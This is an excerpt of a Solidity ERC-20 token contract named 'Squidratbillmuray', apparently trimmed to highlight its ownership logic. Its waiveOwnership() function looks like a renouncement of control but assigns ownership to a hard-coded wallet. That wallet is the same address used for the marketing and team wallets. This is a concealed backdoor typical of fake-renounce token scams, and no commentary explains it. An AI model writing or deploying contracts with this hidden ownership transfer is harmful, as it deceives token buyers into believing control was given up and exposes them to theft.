...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x1b7D565f08f338cF989C791d3e4eE6b8Bb98EBc7);
    }
...
contract Squidratbillmuray is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Squidratbillmuray";
    string private _symbol = "Squidratbillmuray";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1b7D565f08f338cF989C791d3e4eE6b8Bb98EBc7);
    address payable public teamWalletAddress = payable(0x1b7D565f08f338cF989C791d3e4eE6b8Bb98EBc7);
